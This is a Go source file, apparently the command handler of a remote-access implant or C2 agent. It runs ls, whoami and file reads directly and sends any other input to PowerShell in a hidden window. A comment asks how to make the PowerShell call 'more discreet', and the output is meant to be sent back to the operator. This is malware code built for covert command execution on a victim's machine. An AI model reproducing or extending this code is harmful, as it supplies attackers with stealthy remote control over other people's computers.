package cmd

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
)

func ExecuteCommand(input string, opts *CliOptions) (string, error) {

	if strings.HasPrefix(input, "ls") || strings.HasPrefix(input, "dir") {
		toExec := strings.SplitN(input, " ", 2)
		args, _ := os.Getwd()
		if len(toExec) == 2 {
			args = toExec[1]
		}

		if opts.DebugEnabled {
			fmt.Printf("[+] Executing ls with dirpath: %s\n", args)
		}

		return ExecLs(args)
	}

	if input == "whoami" {
		user, err := user.Current()
		if err != nil {
			return "", err
		}
		return user.Username, err
	}

	if strings.HasPrefix(input, "cat") || strings.HasPrefix(input, "less") {
		toRead := strings.SplitN(input, " ", 2)

		if len(toRead) == 2 {
			file, err := os.Open(toRead[1])
			if err != nil {
				return "", err
			}
			defer file.Close()

			buffer := make([]byte, 2048)
			var out string

			for {
				n, err := file.Read(buffer)
				if err != nil {
					break
				}

				out += string(buffer[:n])
			}
			return out, nil

		} else {
			return "", errors.New("no such file")
		}
	}

	if opts.DebugEnabled {
		fmt.Printf("[+] Executing powershell.exe with dirpath: %s\n", input)
	}

	/* TODO: improve the call to powershell to something more discreet ? */
	cmd := exec.Command("powershell", input)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	/* retrieve output or error & send it back! */
	out, err := cmd.CombinedOutput()
	return string(out), err
}
